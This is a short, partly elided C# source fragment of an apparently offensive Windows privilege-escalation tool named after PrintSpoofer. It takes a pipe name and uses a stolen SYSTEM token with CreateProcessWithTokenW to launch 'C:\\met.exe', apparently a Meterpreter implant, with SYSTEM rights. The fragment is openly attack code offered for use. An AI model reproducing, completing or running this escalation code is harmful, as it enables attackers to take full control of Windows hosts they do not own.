...
namespace PrintSpooferNetWithoutInteractive
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNetWithoutInteraction.exe pipename");
                return;
            }
            ...
            CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, "C:\\met.exe", (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
        }
    }
}
